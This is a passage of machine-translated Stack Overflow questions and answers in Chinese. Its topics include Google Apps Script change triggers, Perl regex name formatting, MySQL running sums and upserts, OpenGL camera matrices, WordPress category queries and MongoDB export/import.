> 
> 时间：2013-12-05T23:11:19.313

Google 添加了一个“更改时”事件，该事件可检测行/列插入/删除以及其他类型的更改，您可以[在此处](https://developers.google.com/apps-script/guides/triggers/events#change)在`changeType`. 以下是[此处](https://developers.google.com/apps-script/guides/triggers/installable#managing_triggers_manually)详细说明如何向项目添加触发器的说明，以便在发生“更改时”事件时调用您的函数。

> 要通过脚本编辑器中的对话框手动创建可安装触发器，请执行以下步骤：
> 
> 1.  从脚本编辑器中，选择**Edit > Current project's triggers**。
> 2.  **单击显示：未设置触发器**的链接。**点击这里现在添加一个**。
> 3.  在**Run**下，选择要触发的函数的名称。
> 4.  在**事件**下，选择**时间驱动**或脚本[绑定](https://developers.google.com/apps-script/scripts_containers)到的 Google 应用程序（例如，**来自电子表格**）。
> 5.  选择并配置您要创建的触发器类型（例如，每小时运行的**小时**计时器**或**打开的**触发器**）。
> *****   或者，单击**通知**以配置在触发功能失败时通过电子邮件与您联系的方式和时间。*   单击**保存**。****

 ****在第 4 步中，您将选择**From 电子表格**，在第 5 步中，您将选择**On change**。这应该有你正在寻找的效果。如果您尝试在要分发给用户的附加组件中使用它，还有以编程方式添加触发器和请求授权的选项。两者都在[Installable Triggers](https://developers.google.com/apps-script/guides/triggers/installable)文档中有详细说明。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-03-05T21:37:46.433

有许多编辑操作不会触发`onEdit()`，这不是一个完整的列表，还有[更多报告的排除](https://code.google.com/p/google-apps-script-issues/issues/list?can=2&q=onedit)项：

*   表单提交[问题 4568](https://code.google.com/p/google-apps-script-issues/issues/detail?id=4568&q=onedit&colspec=Stars%20Opened%20ID%20Type%20Status%20Summary%20Component%20Owner)。
*   ~~插入或删除行或列[问题 1363](https://code.google.com/p/google-apps-script-issues/issues/detail?id=1363&q=onedit&colspec=Stars%20Opened%20ID%20Type%20Status%20Summary%20Component%20Owner)~~
*   外观变化（字体、格式、对齐方式、边框）[问题 2476](https://code.google.com/p/google-apps-script-issues/issues/detail?id=2476)
*   范围填充（例如，从 1、2、3 开始；选择这些单元格，然后拖动“手柄”以用 4、5、6 填充更多单元格...）[问题 399](https://code.google.com/p/google-apps-script-issues/issues/detail?id=399)
*   脚本写入的值。[第 338 期](https://code.google.com/p/google-apps-script-issues/issues/detail?id=338)
*   查找/替换[问题 1754](https://code.google.com/p/google-apps-script-issues/issues/detail?id=1754&q=onedit&colspec=Stars%20Opened%20ID%20Type%20Status%20Summary%20Component%20Owner)
*   [第 1568](https://code.google.com/p/google-apps-script-issues/issues/detail?id=1568)期,[第 1119 期](https://code.google.com/p/google-apps-script-issues/issues/detail?id=1119)

如果您确实想知道电子​​表格中有多少行，则执行大约需要 120 毫秒：

```
var numCols = SpreadsheetApp.getActiveSheet().getRange("1:1").getLastColumn();
var numRows = SpreadsheetApp.getActiveSheet().getRange("A:A").getLastRow(); 
```

我已经展示了[将值写入工作表](https://stackoverflow.com/questions/15145918/what-is-faster-scriptdb-or-spreadsheetapp/15149959#15149959)比使用 ScriptDB 更快。您可以预期写入一个小范围的时间很短，大约 1 毫秒。

因此，如果您*可以*检测到正在添加的行或列，那么注册更改将花费不到十分之二秒的时间。这`onEdit()`演示了一种测量电子表格范围并报告工作表尺寸变化的技术。（测试、添加或删除行或列，然后进行编辑以触发`onEdit()`.）它还包含计时器 - 随意尝试其他测量和/或存储值的方法，看看哪种方法最适合您。

```
function onEdit() {
  // Use start & stop to time operations
  var start = new Date().getTime();

  // We want the size of the sheet, so will select ranges across and down the
  // whole sheet. Cannot use getDataRange(), as it selects only occupied cells.
  var numCols = SpreadsheetApp.getActiveSheet().getRange("1:1").getLastColumn()
  var numRows = SpreadsheetApp.getActiveSheet().getRange("A:A").getLastRow();

  var stop = new Date().getTime();
  var timeToMeasure = (stop-start);

  // Did things change?
  var oldSize = SpreadsheetApp.getActiveSheet().getRange("A1:B1").getValues();
  if (oldSize[0][0] != numCols || oldSize[0][1] != numRows) {
    // Yes, they did - Let's store the new dimensions
    start = new Date().getTime();

    SpreadsheetApp.getActiveSheet().getRange("A1:B1").setValues([[numCols,numRows]]);

    var stop = new Date().getTime();
    var timeToStore = (stop-start);  

    Browser.msgBox("Sheet is "+numCols+" by "+numRows+"."
                  +" ("+timeToMeasure+"ms to measure, "+timeToStore+"ms to store.)");
  }
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-07-13T21:27:58.453

我最近使用了另一种方法。每次触发 onEdit() 时，它都会返回一个[事件对象](https://developers.google.com/apps-script/guides/triggers/events)(e)，它会为您提供有关正在发生的事情的一些有价值的信息。

例如，它为您提供范围，您可以从 e.range 中检索该范围。从那里您可以通过许多不同的方式进行横向分析，例如了解正在编辑的行。但是在 e 对象中也有更多有用的数据。它为您提供您编辑的单元格的“旧值” （ **e.oldValue** ）和新值（**e.value**）。

将所有这些信息混合在一起的一种可能方法是获取与您正在编辑的行相对应的范围，然后检查所有单元格是否为空（但您刚刚编辑的那个）以及是否没有 oldValue。

这不一定对应于电子表格的最后一行，而是一个空行。如果您与填写数据的方式一致，这可能对您有用：

```
//val = inserted value (e.value);
//old = old Value (e.oldValue);
//col = number of column being edited
//arr = array with the indexes of the columns that should be completed so as to make a new row [0,1,2...n]
function isInsert(old, val, col, arr){
   if((typeof val != "object")&&!old&&(arr.some(isNotEmpty, col)))
     return true;
   else
     return false;
}

function isNotEmpty(el){
   if(this == el)
     return true;
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-11-01T20:42:47.127

在我授予脚本权限之前，我遇到了麻烦。否则 PropertiesService 功能将不起作用。一旦我这样做了，我就能够使用以下代码检测插入了哪一行：

```
var props = PropertiesService.getUserProperties();

function onEdit(e) {
  props.setProperty("firstRow", e.range.getRow());
  props.setProperty("lastRow", e.range.getLastRow());
}

function onChange(e){
if(e.changeType=="INSERT_ROW")
    SpreadsheetApp.getUi().alert("Inserted Rows: " +
                                 props.getProperty("firstRow") + 
                                 " - " +
                                 props.getProperty("lastRow"));
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-03-22T22:51:31.640

我一直在玩 onEdit 和 onChange。onEdit 响应允许您访问已编辑的行。不幸的是，onChange 响应不允许您这样做。因此，对于一个强大的解决方案，您似乎需要同时吸引这两个触发器。如果您的工作表不需要空行/列，则以下脚本将删除所有新添加的行/列，删除所有空白行/列（以防用户批量添加行/列），然后警告用户他们无法添加行或列：

```
//////////////////////
// Global Variables //
//////////////////////

var SHEET = SpreadsheetApp.getActiveSheet();
var PROPERTIES = PropertiesService.getScriptProperties();

////////////////////
// Event Triggers //
////////////////////

/**
 * Track original sheet row/column count and register onChange trigger.
 */
function onOpen()
{
    // Set original dimensions
    PROPERTIES.setProperty('rows', SHEET.getMaxRows());
    PROPERTIES.setProperty('columns', SHEET.getMaxColumns());

    // Create onChange trigger
    ScriptApp
        .newTrigger('deleteNewRowsAndColumns')
        .forSpreadsheet(SpreadsheetApp.getActive())
        .onChange()
        .create();
}

/**
 * If new rows or columns were added to the sheet
 * warn the user that they cannot perform these
 * actions and delete empty (new) rows and columns.
 *
 * @param e
 */
function deleteNewRowsAndColumns(e)
{
    switch(e.changeType) {
        case 'INSERT_COLUMN':
            removeEmptyColumns();
            warn();
            break;
        case 'INSERT_ROW':
            removeEmptyRows();
            warn();
            break;
        default:
            return
    }
}

///////////////
// Utilities //
///////////////

/**
 * Remove empty columns.
 *
 * This function assumes you have a header row in which
 * all columns should have a value. Change headerRow value
 * if your headers are not in row 1.
 */
function removeEmptyColumns() {
    var maxColumns = SHEET.getMaxColumns();
    var lastColumn = SHEET.getLastColumn();
    if (maxColumns - lastColumn != 0) {
        // New column(s) were added to the end of the sheet.
        SHEET.deleteColumns(lastColumn + 1, maxColumns - lastColumn);
    } else {
        // New column was added in the middle of the sheet.
        // Start from last column and work backwards, delete
        // first column found with empty header cell.
        var headerRow = 1;
        var headers =  SHEET.getRange(headerRow, 1, 1, lastColumn).getValues()[0];
        for (var col = lastColumn; col >= 1; col--) {
            if (headers[col -1] == '') {
                SHEET.deleteColumn(col);
                // Since can only insert one column to the left
                // or right at a time, can safely exit here;
                break;
            }
        }
    }
}

/**
 * Remove empty rows.
 *
 * This function assumes that all rows should
 * have data in the first cell.
 */
function removeEmptyRows() {
    var maxRows = SHEET.getMaxRows();
    var lastRow = SHEET.getLastRow();
    if (maxRows-lastRow != 0) {
        // New row(s) were added to the end of the sheet.
        SHEET.deleteRows(lastRow + 1, maxRows - lastRow);
    } else {
        // New row was added in the middle of the sheet.
        // Start from last column and work backwards, delete
        // first empty column found.
        var values = SHEET.getRange('A:A').getValues();
        var startIndex = values.length - 1;
        for (var i = startIndex; i >= 0; i--) {
            if (values[i] && values[i][0] == '') {
                SHEET.deleteRow(i + 1);
                // User can bulk add rows to the bottom of the file
                // but can only add 1 above or below at a time in the
                // middle of the file, so it's safe to exit here.
                break;
            }
        }
    }
}

/**
 * Return user warning message about adding new rows and columns
 */
function warn()
{
    SpreadsheetApp.getUi().alert('You cannot add new rows or columns.');
} 
```****

# java - 关于编写一个执行项目其他模块中的测试类的Java类的建议

> ID：15232412
> 
> 赞同：0
> 
> 时间：2013-03-05T19:25:30.263
> 
> 标签：java, junit

我正在使用 intellij idea 11 开发一个 java 项目。

我在项目下有各种模块，例如 com.abc 有 src 和 test 文件夹。测试文件夹是项目的测试路由文件夹。该文件夹下有各种测试用例。

现在我需要编写一个新模块，它有一个 java 类，可以调用各种模块中的测试用例。我没有找到办法。

我创建了一个模块，例如 com.abtestsuite，并添加了对存在相应测试用例的其他模块的依赖项。

请建议我更进一步？我可以使用 JUnitCore 类吗？我不知道如何使用它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:53:10.447

正如其他人所建议的那样 - 我建议将您的项目转换为 Maven 项目。

然后在您的 POM 中创建一个配置文件并使用 cobertura 插件，如下所示：

```
<profile>
        <id>testcheck</id>
        <build>
            <plugins>
                <plugin>
                    <groupId>org.codehaus.mojo</groupId>
                    <artifactId>cobertura-maven-plugin</artifactId>
                    <version>2.5.1</version>
                    <configuration>
                        <check>
                            <branchRate>0</branchRate>
                            <lineRate>0</lineRate>
                            <haltOnFailure>true</haltOnFailure>
                            <totalBranchRate>90</totalBranchRate>
                            <totalLineRate>90</totalLineRate>
                            <packageLineRate>0</packageLineRate>
                            <packageBranchRate>0</packageBranchRate>
                        </check>
                    </configuration>
                    <executions>
                        <execution>
                            <phase>verify</phase>
                            <goals>
                                <goal>clean</goal>
                                <goal>check</goal>
                            </goals>
                        </execution>
                    </executions>
                </plugin>
            </plugins>
        </build>
    </profile> 
```

这确实是最好的方法。特别是因为您在项目中包含的每个模块也可以拥有自己的 POM，具有自己的覆盖率和检查。

# ios - UIScrollView 不会滚动

> ID：15232414
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:25:41.683
> 
> 标签：ios, ipad, uiscrollview

我有一个 iPad 应用程序，您可以在其中左右滚动，就像在 iPhone 的 App Store 中一样。但是当我在模拟器中测试应用程序时，我无法让它滚动......

这是我的代码：

`scrollView.frame = CGRectMake(74, 261, 620, 354); [scrollView setContentSize:CGSizeMake(1220, 354)];`

有人知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-06T02:12:49.900

*self.userInteractionEnabled = YES 也许有帮助*

# perl - 如何操作 csv 中的字符串以从选择列中的所有字符串中删除部分？

> ID：15232416
> 
> 赞同：0
> 
> 时间：2013-03-05T19:25:48.957
> 
> 标签：perl, csv

我一直在研究一个脚本，它从文件中提取数据并将其转换为更可用的格式。到目前为止，我已经设法以如下所示的格式将数据转换为 csv。

```
data1   data2   name        data3
00958c  JMOP    Nixon, Richard  e004a
00967c  CMLL    Dole, Bob             a006n 
```

我要弄清楚的是如何获取“名称”列中的数据并创建一个新变量，例如：

```
Rnixon01
Bdole01 
```

我猜我会`s///`以某种方式使用运算符，但我对 perl 还是很陌生。预先感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:35:04.400

听起来您已经知道如何[解析 CSV](http://search.cpan.org/perldoc?Text%3a%3aCSV_XS)并且您只是在寻找

```
my ($lname, $fname) = split /,\s*/, $name;
my $id = uc(substr($fname, 0, 1)) . lc($lname);
$id .= sprintf '%02d', ++$counts{$id}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:50:25.757

这是`s`直接使用运算符的一个：

```
$name =~ s{ 
    ([^, ]+)    # Everything up to the space or comma, the last name
    \s* , \s*   # Comma, potentially with space around it
    (\w)        # The first letter of the first name
    .*          # The rest (which we don't want to capture, but want to replace)
 }{
     uc($2) .   # First letter (upper case)
     lc($1)     # last name (lower case)
 }xmse; 
```

如何增加计数器：查看其他答案。

是的，这是正则表达式的一个非常精细的版本，但可能是你会“在野外”遇到的东西，也应该是写的。`x`in`xms`允许您在正则表达式中添加空格甚至注释，它告诉`e`Perl 将第二个块评估为代码。是的，`s{}{}`作品，即使有嵌套的大括号;-)

有关正则表达式运算符的语法可能性的更多信息，请参阅[`perldoc perlop`](http://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T19:54:03.413

你可以这样做

```
$name =~ s/([^,]+),\s*([^,]).*/$2$1/ 
```

然后在末尾添加数字。我假设这些数字是用于区分多个`RNixon`s 的序列号。在这种情况下，您需要一个哈希来计算每个名称出现的次数。

这个程序演示

```
use strict;
use warnings;
use 5.014;

my %sequence;
for ('Nixon, Richard', 'Dole, Bob') {
  my $name = s/([^,]+),\s*([^,]).*/$2$1/r;
  $name = sprintf '%s%02d', $name, ++$sequence{$name};
  print "$name\n";
} 
```

**输出**

```
RNixon01
BDole01 
```

# iphone - MobileSubstrate：如何使对象全局可访问

> ID：15232422
> 
> 赞同：1
> 
> 时间：2013-03-05T19:26:38.690
> 
> 标签：iphone, global, ivar, springboard, cydia-substrate

我目前正在使用substrate.h 开发MobileSubstrate 扩展，我需要一个可以从每个捆绑包中访问的对象。

据我所知（并且我尝试过），如果我只是`static`在代码中放置一个变量，这只会使对象在当前注入的包（例如 SpringBoard 或任何应用程序）中可访问。

所以我想知道能够从每个应用程序（包）访问同一个对象的最佳方法是什么？

我有在类中添加实例变量的想法`SpringBoard`，但显然我无法调用`class_addIvar()`现有类。

任何帮助是极大的赞赏。

# c# - 随机排序时无限滚动中的重复记录

> ID：15232423
> 
> 赞同：0
> 
> 时间：2013-03-05T19:26:39.103
> 
> 标签：c#, sql-server, asp.net-mvc, jquery

我有一个无限滚动的网页。我正在用随机记录喂这个卷轴（我正在使用`order by newid()`它）。当滚动到达末尾时，有一个 ajax 调用会在页面上附加新的随机数据。显然，我用这种方法得到了重复的记录。这是我的问题：有没有办法避免重复记录？我应该将已经加载到页面的记录存储在某处并将它们从选择中排除吗？或者我应该选择带有随机记录的巨大记录集，将其保存在内存中，然后用这个记录集的块提供页面？随机无限滚动的正确方法是什么？提前致谢！

**编辑**

要求的代码：

数据提供者：

```
res = data.OrderBy(l => Guid.NewGuid()).Take(numberOfRecords); 
```

客户：

```
$.get("/Start/Index/", function (data) {
                if (data != '') {                        
                    isLoading = false;
                    $("#tiles").append(data);}); 
```

服务器：

```
model.PageData = _dataProvider.GetOnePage(recordsPerPage);
return PartialView("_MyView", model.PageData); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:36:55.187

据我了解，对于大型表，使用 newid 并不快——SqlServer 必须先为表中的每一行分配一个随机值，然后才能进行排序。这篇 MSDN 文章有一个小讨论：http: [//msdn.microsoft.com/en-us/library/cc441928.aspx](http://msdn.microsoft.com/en-us/library/cc441928.aspx)

要在每次运行查询时获得“相同的随机结果”，您需要计算和存储订单，或者根据您存储的种子使其可预测。

你可以尝试这样的事情：

```
 SELECT * FROM Table1
  WHERE (ABS(CAST(
  (BINARY_CHECKSUM(*)) as int)) % 100) < 10 
```

BINARY_CHECKSUM 函数的一个属性是，每次在未修改的行上使用它时，它都会返回相同的校验和数。因此，当它单独使用时，查询的后续运行会返回相同的“随机”行集。通常这是不可取的，但出于您的目的，它可能是可取的。为了使其对不同用户更加随机，您可以通过 RAND(?) 多次 BINARY_CHECKSUM(*) 并传入您为该用户会话存储的种子。您还可能希望将 BINARY_CHECKSUM 中使用的列限制为可预测且不会更改的内容，例如 ID 和 created_at 时间戳，并添加 where id > 。

把它们放在一起，查询可能看起来像这样：

```
 SELECT * FROM Table1
  WHERE id > ? AND (ABS(CAST(
  (BINARY_CHECKSUM(*) * RAND(?)) as int)) % 100) < 10 
```

然后传入两个参数：第一次显示无限滚动时的最大 id 和当时生成的种子。

不幸的是，我无法尝试 - 如果它有效，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T17:02:38.080

经过 2 天的研究，我发现没有简单的方法可以在没有重复记录的情况下进行随机无限滚动。我决定如果我不能做随机滚动，我必须做看起来像随机的滚动，但实际上不是。所以最终得到了这个解决方案：

```
data = data.OrderByDescending(link => EntityFunctions.TruncateTime(link.link_timestamp)).OrderBy(l => l.link_randomid).Skip(skip).Take(numberOfRecords); 
```

其中 link_randomid 是在记录插入时生成的唯一随机 id。希望这会为某人节省一些时间。

# mysql - 如何在 SQL 中添加变量

> ID：15232428
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:26:52.563
> 
> 标签：mysql, sql

我有一个变量需要按月显示。此变量是一个布尔值，如果它设置为 True，则表示该应用程序已安装。

示例：变量 = 已安装的应用程序

1 月份有 20 个安装的应用程序。2 月份安装了 10 个应用程序。3 月份安装了 5 个应用程序。

我想在表格上显示所有已安装的应用程序（布尔 = True）：

```
January: 20

February: 20 (January) + 10 =  30

March: 20 (January) + 10 (February) + 5 (March) = 35 
```

有谁知道我如何在 Mysql 中做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:31:50.967

您可以使用子查询按月对安装进行分组。然后你可以在外部查询中使用一个变量来计算累积和：

```
select  installation_year
,       installation_month
,       installation_count
,       (@running_sum:= @running_sum + installation_count) as cumulative_sum
from    (
        select  year(installation_date) as installation_year
        ,       month(installation_date) as installation_month
        ,       count(*) as installation_count
        from    YourTable
        group by
                installation_year
        ,       installation_month
        ) as SubQueryAlias
join    (select @running_sum := 0) as InitVars
order by 
        installation_year
,       installation_month 
```

[SQL Fiddle 的示例。](http://sqlfiddle.com/#!2/321a3/6/0)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:33:09.837

就像是：

```
Select COUNT(*),Month 
From Apps
where installed = true
group by Month 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:31:24.360

如果我理解正确，这只是一个带有 order by 的简单查询。

```
select COLUMNS_YOU_WANT from TABLE_NAME 
where YOUR_BOOLEAN == True 
order by SOME_DATE_COLUMN 
```

希望您对 SQL 足够精通，可以将这些部分替换为您需要的部分。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:32:40.353

我假设您有一个“应用程序”表，其中包含一个“已安装”列和一个“已安装日期”列。如果是这样的话...

```
SELECT Count(*)
FROM   Applications
WHERE  Installed = 1 -- Assumes a bit/boolean column.
AND    InstalledDate BETWEEN @StartDate AND @EndDate; 
```

斯科特

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-08T20:40:09.067

我得到了它！我使用了递归

`SELECT (select id_time from database.dim_time where id_time = a.fk_time) AS yearmonth, (select sum( if( installed in (1), 1,0)) as installed from database.facts_table where fk_time <= yearmonth ) as installed FROM database.facts_table AS a GROUP BY yearmonth ORDER BY yearmonth ASC`

# c++ - 在 OpenGL 中平移相机矩阵

> ID：15232429
> 
> 赞同：3
> 
> 时间：2013-03-05T19:26:58.993
> 
> 标签：c++, math, opengl, matrix, 3d

所以直到最近我一直在像这样转换我的 OpenGL 对象（Rotation_Matrix 是 GLfloat[16]，我从存储对象方向的四元数中得到它，效果很好）：

```
glTranslatef(Position.x, Position.y, Position.z);
glMultMatrixf(Rotation_Matrix); 
```

但我最近发现，如果我先这样做，我可以做 glMultMatrixf()：

```
Rotation_Matrix[12] = Position.x;
Rotation_Matrix[13] = Position.y;
Rotation_Matrix[14] = Position.z; 
```

这可以很好地翻译一切，我相信这对于以后过渡到 OpenGL 3.0+ 很重要？因为我们必须有自己的矩阵，我想。

所以我切换到没有 glTranslatef() 的新系统，除了我的相机，一切都很好。*对于相机，我从方向四元数的倒数*中得到 Camera_Matrix ，它曾经像这样正常工作：

```
glMultMatrixf(Camera_Matrix);
glTranslatef(-CameraPos.x, -CameraPos.y, -CameraPos.z); 
```

但是，如果我将值 12、13 和 14 设置为 -CameraPos，则相机不会向右移动，有时向前移动会使它向侧面移动，反之亦然，而且我移动得越多，移动就越错误。

如何正确地将翻译添加到相机的转换矩阵？

**解决方案：**

您必须计算点积，而不是使用正常位置（记住这些是 OpenGL 矩阵！）：

```
GLfloat xDot = Position.x * m_RotationMatrix[0] +
               Position.y * m_RotationMatrix[4] +
               Position.z * m_RotationMatrix[8];

GLfloat yDot = Position.x * m_RotationMatrix[1] +
               Position.y * m_RotationMatrix[5] +
               Position.z * m_RotationMatrix[9];

GLfloat zDot = Position.x * m_RotationMatrix[2] +
               Position.y * m_RotationMatrix[6] +
               Position.z * m_RotationMatrix[10];

m_RotationMatrix[12] = -xDot;
m_RotationMatrix[13] = -yDot;
m_RotationMatrix[14] = -zDot; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:58:33.253

相机的模型转换将是

```
M = T * R 
```

由于视图变换是相反的，所以这是

```
V = R^-1 * T^-1 
```

这意味着整体旋转包含一个旋转的平移向量。您必须从点积计算它：

```
translation.x = -dot(position, right vector)
translation.y = -dot(position, up vector)
translation.z = -dot(position, direction vector) 
```

您可以从矩阵中检索这些向量。它们位于前三列/行中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:01:29.647

您可能正在世界空间中进行翻译。您想在视图/相机空间中进行翻译。请务必阅读您最喜欢的参考资料，或[http://http.developer.nvidia.com/CgTutorial/cg_tutorial_chapter04.html](http://http.developer.nvidia.com/CgTutorial/cg_tutorial_chapter04.html)。展望未来，不依赖 opengl 进行矩阵数学（已弃用）可能是个好主意。考虑使用 glm。

# jquery - 将 tinyscrollbar 更新功能与 jquery onclick 事件一起使用的正确方法是什么？

> ID：15232435
> 
> 赞同：1
> 
> 时间：2013-03-05T19:27:07.267
> 
> 标签：jquery, onclick, slidedown, slideup, tinyscrollbar

`slideUp()`我有一个使用 jquery和`sideDown()`函数单击按钮时显示或隐藏的状态列表。

我正在尝试使用[jquery tinyscrollbar](http://baijs.nl/tinyscrollbar/)为其添加自定义滚动条。

我在这里有一个 jsfiddle：http: [//jsfiddle.net/ByteMyPixel/acLch/](http://jsfiddle.net/ByteMyPixel/acLch/)

我几乎让它工作了，但卡住了 - tinyscrollbar 显示在第二次点击事件/`slideUp()`而不是`slideDown()`.

有关如何解决此问题以使 tinyscrollbar 出现`slideDown()`并消失的任何想法`slideUp()`？

这是我的代码：

```
var oScrollbar1 = $('#scrollbar1');
oScrollbar1.tinyscrollbar();

$("a.button").click(function () {

oScrollbar1.tinyscrollbar_update();

    if ($("ul.scrolling").is(":hidden")) {
        $("ul.scrolling").slideDown("slow");
    } else {
        $("ul.scrolling").slideUp("slow");
    }
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-10-06T09:14:47.677

像这样使用 jQuery 的 tinyscrollbar：

```
var scroll = $("#add-widget-scroll").tinyscrollbar(); 
```

我做了一些研究，发现可以使用以下方法访问“更新”功能：

```
$(scroll).data().plugin_tinyscrollbar.update(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-07T20:57:02.683

```
 var oScrollbar1 = $('#scrollbar1');
    oScrollbar1.tinyscrollbar();

    $("a.button").click(function() 
    {
        $("ul.scrolling").slideToggle("slow", function()
        {                               
            oScrollbar1.tinyscrollbar_update();
        });
    }); 
```

这将解决您的问题:)

# php - WordPress 类别列表

> ID：15232438
> 
> 赞同：0
> 
> 时间：2013-03-05T19:27:13.383
> 
> 标签：php, wordpress, list, categories

您好我正在尝试显示一个类别下的所有帖子。看起来像这样

*   游戏

    *   G

        *   战争机器

            （游戏下的所有帖子都在这里）

        *   几何大战

            （几何战争下的所有帖子都在这里）

这就是我在创建它们时在 wordpress 中对帖子进行分类的方式，因此它们不会混淆。但是当我尝试渲染它们时它们仍然会这样做。G下的所有帖子都显示在每个游戏标题下（战争机器，几何战争）我只想要战争机器下有任何帖子的帖子，它们应该显示在战争机器下。不在几何战争之下。

这是我的代码：

```
<?php
$cat_id = get_query_var('cat');
$catlist = get_categories('hide_empty=0&child_of=' . $cat_id);
$cat_child = get_field('frontend_name' , 'category_'  . get_query_var('cat' ));

foreach($catlist as $categories_item) {
    echo "<ol>";
    echo '<h3><a href="' . get_category_link( $categories_item->term_id ) . '" ' . '>' . $categories_item->description .'</a> </h3> ';
    query_posts("cat=$cat_id&post_per_page=9999");

if (have_posts()) : while (have_posts()) : the_post(); ?>
    <li><a href="<?php the_permalink();?>">
      <?php the_title(); ?>
   </a></li>
<?php endwhile; endif; ?>
<?php echo "</ol>"; ?>
<?php } ?> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:44:55.273

改变

```
query_posts("cat=$cat_id&post_per_page=9999"); 
```

到

```
query_posts("cat=" . $categories_item->term_id . "&post_per_page=9999"); 
```

# mongodb - mongoexport 包含 Ids 并且 import 不会忽略它们

> ID：15232442
> 
> 赞同：0
> 
> 时间：2013-03-05T19:27:41.417
> 
> 标签：mongodb

我正在尝试使用导出/导入在 MongoDB 数据库之间移动一些数据。我有一个包含数组字段的嵌入式文档，我想用它来更新另一个数据库。

我的第一个问题是尝试从嵌入文档中只导出我需要的字段，我可以获得整个子文档，但不仅仅是我想要的字段。好吧，那不是表演的终结者。这是我的导出命令；

```
mongoexport -d mydb -c mycollection -o ~/temp/mongoexport/myexport.json -f id_field,subdoc_field2 -q '{$query:{"subdoc.subfield":{"$exists":true}}}' 
```

我得到看起来像这样的东西

```
{ "_id" : { "$oid" : "5060f491585dc52991000002" }, "id_field" : "R0410202", "subdoc" : [ { "_id" : { "$oid" : "50eb073d585dc586d600363e" },"subdoc_field1": "value1", "subdoc_field2": [intval1, intval2]}]}
{ "_id" : { "$oid" : "5060f491585dc52991000003" }, "id_field" : "R0410202", "subdoc" : [ { "_id" : { "$oid" : "50eb073d585dc586d600364d" },"subdoc_field1": "value2", "subdoc_field2": [intval3, intval4]}]} 
```

当我尝试导入它时，它不会更新匹配的文档。这是我的命令；

```
mongoimport  -c mycollection --db assr3_production --file ~/temp/mongoexport/myexport.json -f subdoc_field2  --upsert --upsertFields id_field 
```

我收到一条错误消息“无法更改文档的 _id”。我并没有尝试更改 ID，但它似乎无论如何都在尝试。

有没有办法让导出不包含 ID，或者让导入忽略它们？谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:10:42.700

Steve07，您想使用投影从查询结果中显式删除 _id。

有关详细信息，请参见[此处](http://docs.mongodb.org/manual/applications/read/#with-a-projection)。

# mysql - SQL 语句包含 IF EXIST

> ID：15232443
> 
> 赞同：0
> 
> 时间：2013-03-05T19:27:51.717
> 
> 标签：mysql, sql

我的项目中有一条关于 sql 语句的问题。编码

```
IF EXISTS (SELECT * FROM person_drug WHERE drug_id=3 AND person_id=1)
BEGIN
   UPDATE person_drug SET amount=3 WHERE drug_id=3 AND person_id=1
END
ELSE
BEGIN
   INSERT INTO person_drug VALUES (1,3,3)
END 
```

当我运行它时，我得到：

> 1064 - 您的 SQL 语法错误中有错误。

但是当我`UPDATE,SELECT,INSERT`单独运行上面的语句时，我没有收到任何错误。可能是什么问题？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:33:28.613

MySQL 的流控制语句 ( `IF/ELSE/WHILE`) 只能在存储过程或函数的上下文中使用。它们不适用于交互式查询。

最好的解决方案是利用适当的索引和唯一性约束。

如果您在 中定义了主键或唯一索引`(drug_id, person_id)`，那么您可以在一个语句中[使用`ON DUPLICATE KEY UPDATE`](http://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html)并执行整个操作：

```
/* key ensures uniqueness for drug_id, person_id */
ALTER TABLE person_drug ADD UNIQUE KEY (drug_id, person_id);

/* Then it's possible to use INSERT .. ON DUPLICATE KEY UPDATE */
INSERT INTO person_drug (drug_id, person_id, amount) 
  VALUES (3, 1, 3)
  ON DUPLICATE KEY UPDATE amount = VALUES(amount) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T05:28:44.943

如果您制作存储过程意味着您可以这样做：

设置 ANSI_NULLS ON 设置 QUOTED_IDENTIFIER ON GO

创建过程人员

开始

```
SET NOCOUNT ON;

IF EXISTS 
(SELECT * FROM person_drug WHERE drug_id=3 AND person_id=1) 
```

BEGIN UPDATE person_drug SET amount=3 WHERE drug_id=3 AND person_id=1 END ELSE BEGIN INSERT INTO person_drug VALUES (1,3,3)

结束 结束 GO

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:31:25.977

```
 BEGIN
       IF EXISTS (SELECT * FROM person_drug WHERE drug_id=3 AND person_id=1)
       UPDATE person_drug SET amount=3 WHERE drug_id=3 AND person_id=1
    ELSE
       INSERT INTO person_drug VALUES (1,3,3)
    END IF; 
```

# c - 静态库中未在标头中公开的函数是否可访问？

> ID：15232444
> 
> 赞同：0
> 
> 时间：2013-03-05T19:27:57.503
> 
> 标签：c

